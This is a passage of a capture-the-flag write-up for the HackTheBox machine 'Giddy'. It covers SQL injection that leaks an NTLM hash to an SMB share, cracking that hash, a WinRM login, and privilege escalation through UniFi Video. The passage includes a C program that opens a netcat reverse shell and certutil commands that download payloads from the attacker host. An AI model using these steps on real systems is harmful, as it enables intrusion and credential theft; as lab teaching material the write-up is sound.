+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-06-10T19:20:24+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>GIDDY
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>GIDDY
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>GIDDY
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>Giddy
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>Giddy
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.14393
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-06-10T19:20:19+00:00
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>Giddy
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-06-09T19:15:47
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2025</span>-12-09T19:15:47
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="m">5985</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>Running<span class="w"> </span><span class="o">(</span>JUST<span class="w"> </span>GUESSING<span class="o">)</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">2012</span><span class="p">|</span><span class="m">2016</span><span class="p">|</span><span class="m">2008</span><span class="p">|</span><span class="m">7</span><span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2012:r2<span class="w"> </span>cpe:/o:microsoft:windows_server_2016<span class="w"> </span>cpe:/o:microsoft:windows_server_2008:r2<span class="w"> </span>cpe:/o:microsoft:windows_7
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">91</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>or<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2008</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">85</span>%<span class="o">)</span>
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span>/tcp<span class="o">)</span>
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>HOP<span class="w"> </span>RTT<span class="w">      </span>ADDRESS
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a><span class="m">1</span><span class="w">   </span><span class="m">39</span>.84<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.14.1
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a><span class="m">2</span><span class="w">   </span><span class="m">40</span>.07<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.10.104
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">49</span>.39<span class="w"> </span>seconds
+</span></code></pre></div>
+<p>The webserver shows a picture of a dog.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250610221057.png" /></p>
+<p>Using <code>feroxbuster</code> we find <code>/remote</code> and <code>/mvc</code>.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250610222618.png" /></p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250610222511.png" /></p>
+<p>In <code>/mvc</code> we have a vulnerable SQLi parameter when searching.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250610222736.png" /></p>
+<p>There is a second point of injection in <code>product.aspx</code>, <code>productsubcategoryid</code>.</p>
+<h2 id="initial-access">Initial Access</h2>
+<p>We can use <code>xp_dirtree</code> to try to get a hash. Start an SMB server and execute the query.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId<span class="o">=</span><span class="m">18</span><span class="p">;</span>%20EXEC%20MASTER.sys.xp_dirtree%20%27<span class="se">\\</span><span class="m">10</span>.10.14.17<span class="se">\k</span>ali<span class="se">\t</span>est%27
+</span></code></pre></div>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>impacket-smbserver<span class="w"> </span>-smb2support<span class="w"> </span>kali<span class="w"> </span>.
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Callback<span class="w"> </span>added<span class="w"> </span><span class="k">for</span><span class="w"> </span>UUID<span class="w"> </span>4B324FC8-1670-01D3-1278-5A47BF6EE188<span class="w"> </span>V:3.0
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Callback<span class="w"> </span>added<span class="w"> </span><span class="k">for</span><span class="w"> </span>UUID<span class="w"> </span>6BFFD098-A112-3610-9833-46C3F87E345A<span class="w"> </span>V:1.0
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Config<span class="w"> </span>file<span class="w"> </span>parsed
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Incoming<span class="w"> </span>connection<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.104,49710<span class="o">)</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>AUTHENTICATE_MESSAGE<span class="w"> </span><span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>GIDDY<span class="se">\S</span>tacy<span class="w"> </span>authenticated<span class="w"> </span>successfully
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Stacy::GIDDY:aaaaaaaaaaaaaaaa:a2460a71e3840477bcdba3394bf65d21:0101000000000000801b394ec4dbdb0109baf7b5a3abbf04000000000100100079006e0049006f004a005200680058000300100079006e0049006f004a005200680058000200100043005700410067007a0062006c0068000400100043005700410067007a0062006c00680007000800801b394ec4dbdb01060004000200000008003000300000000000000000000000003000007c1be546a3f4e42191147ba215b5e89f3f388bf71cc4bc9a355f1bce1c1765ba0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003700000000000000000000000000
+</span></code></pre></div>
+<p>Using <code>john</code>:</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span><span class="nb">hash</span><span class="w">  </span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>netntlmv2,<span class="w"> </span>NTLMv2<span class="w"> </span>C/R<span class="w"> </span><span class="o">[</span>MD4<span class="w"> </span>HMAC-MD5<span class="w"> </span><span class="m">32</span>/64<span class="o">])</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Will<span class="w"> </span>run<span class="w"> </span><span class="m">2</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>xNnWo6272k7x<span class="w">     </span><span class="o">(</span>Stacy<span class="o">)</span><span class="w">     </span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>1g<span class="w"> </span><span class="m">0</span>:00:00:01<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2025</span>-06-12<span class="w"> </span><span class="m">20</span>:10<span class="o">)</span><span class="w"> </span><span class="m">0</span>.6250g/s<span class="w"> </span>1680Kp/s<span class="w"> </span>1680Kc/s<span class="w"> </span>1680KC/s<span class="w"> </span>xabat..x9831915x
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show --format=netntlmv2&quot;</span><span class="w"> </span>options<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>Session<span class="w"> </span>completed.<span class="w"> </span>
+</span></code></pre></div>
+<p><code>Stacy:xNnWo6272k7x</code></p>
+<p>Testing credentials with <code>nxc</code>:</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250612201356.png" /></p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.10.104<span class="w"> </span>-u<span class="w"> </span>stacy<span class="w"> </span>-p<span class="w"> </span>xNnWo6272k7x
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Evil-WinRM<span class="w"> </span>shell<span class="w"> </span>v3.7
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Info:<span class="w"> </span>Establishing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>remote<span class="w"> </span>endpoint
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt;<span class="w"> </span>whoami
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>giddy<span class="se">\s</span>tacy
+</span></code></pre></div>
+<p>Get the flag:</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\d</span>esktop&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>user.txt
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>5a7edac0ca154dcfa80ec0b5010112ab
+</span></code></pre></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>The user's document folder has a <code>unifivideo</code> file:</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\d</span>ocuments&gt;<span class="w"> </span>ls
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span>Directory:<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\d</span>ocuments
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>Mode<span class="w">                </span>LastWriteTime<span class="w">         </span>Length<span class="w"> </span>Name
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>----<span class="w">                </span>-------------<span class="w">         </span>------<span class="w"> </span>----
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>-a----<span class="w">        </span><span class="m">6</span>/17/2018<span class="w">   </span><span class="m">9</span>:36<span class="w"> </span>AM<span class="w">              </span><span class="m">6</span><span class="w"> </span>unifivideo
+</span></code></pre></div>
+<p>Searching with <code>searchsploit</code>:</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250612203241.png" /></p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="m">5</span>.<span class="w"> </span>VULNERABILITY<span class="w"> </span><span class="nv">DETAILS</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">========================</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Ubiquiti<span class="w"> </span>UniFi<span class="w"> </span>Video<span class="w"> </span><span class="k">for</span><span class="w"> </span>Windows<span class="w"> </span>is<span class="w"> </span>installed<span class="w"> </span>to<span class="w"> </span><span class="s2">&quot;C:\ProgramData\unifi-video\&quot;</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="s2">by default and is also shipped with a service called &quot;</span>Ubiquiti<span class="w"> </span>UniFi<span class="w"> </span>Video<span class="s2">&quot;. Its</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="s2">executable &quot;</span>avService.exe<span class="s2">&quot; is placed in the same directory and also runs under</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="s2">the NT AUTHORITY/SYSTEM account.</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="s2">However the default permissions on the &quot;</span>C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video<span class="s2">&quot; folder are</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="s2">inherited from &quot;</span>C:<span class="se">\P</span>rogramData<span class="s2">&quot; and are not explicitly overridden, which allows</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="s2">all users, even unprivileged ones, to append and write files to the application</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="s2">directory:</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="s2">c:\ProgramData&gt;icacls unifi-video</span>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="s2">unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="s2">BUILTIN\Administrators:(I)(OI)(CI)(F)</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="s2">CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="s2">BUILTIN\Users:(I)(OI)(CI)(RX)</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="s2">BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)</span>
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="s2">Upon start and stop of the service, it tries to load and execute the file at</span>
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="s2">&quot;</span>C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video<span class="se">\t</span>askkill.exe<span class="s2">&quot;. However this file does not exist in</span>
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="s2">the application directory by default at all.</span>
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="s2">By copying an arbitrary &quot;</span>taskkill.exe<span class="s2">&quot; to &quot;</span>C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video<span class="se">\&quot;</span><span class="w"> </span>as<span class="w"> </span>an
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>unprivileged<span class="w"> </span>user,<span class="w"> </span>it<span class="w"> </span>is<span class="w"> </span>therefore<span class="w"> </span>possible<span class="w"> </span>to<span class="w"> </span>escalate<span class="w"> </span>privileges<span class="w"> </span>and<span class="w"> </span>execute
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>arbitrary<span class="w"> </span>code<span class="w"> </span>as<span class="w"> </span>NT<span class="w"> </span>AUTHORITY/SYSTEM.
+</span></code></pre></div>
+<p>So we can create a <code>taskkill.exe</code> and put it in the folder, restart the service, and the malicious exe will be executed.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>$<span class="w"> </span>cat<span class="w"> </span>taskkill.c<span class="w">                  </span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1">#include &quot;stdlib.h&quot;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>int<span class="w"> </span>main<span class="o">()</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="o">{</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span>system<span class="o">(</span><span class="s2">&quot;C:\\programdata\\unifi-video\\nc.exe -e cmd.exe 10.10.14.17 4444&quot;</span><span class="o">)</span><span class="p">;</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="o">}</span>
+</span></code></pre></div>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$<span class="w"> </span>x86_64-w64-mingw32-gcc<span class="w"> </span>taskkill.c<span class="w"> </span>-o<span class="w"> </span>taskkill.exe
+</span></code></pre></div>
+<p>Upload <code>nc.exe</code> and <code>taskkill.exe</code>:</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\u</span>nifi-video&gt;<span class="w"> </span>certutil<span class="w"> </span>-f<span class="w"> </span>-split<span class="w"> </span>-urlcache<span class="w"> </span>http://10.10.14.17:8000/taskkill.exe
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\p</span>rogramdata<span class="se">\u</span>nifi-video&gt;<span class="w"> </span>certutil<span class="w"> </span>-f<span class="w"> </span>-split<span class="w"> </span>-urlcache<span class="w"> </span>http://10.10.14.17:8000/nc.exe
+</span></code></pre></div>
+<p>Start and stop the service and start the listener:</p>
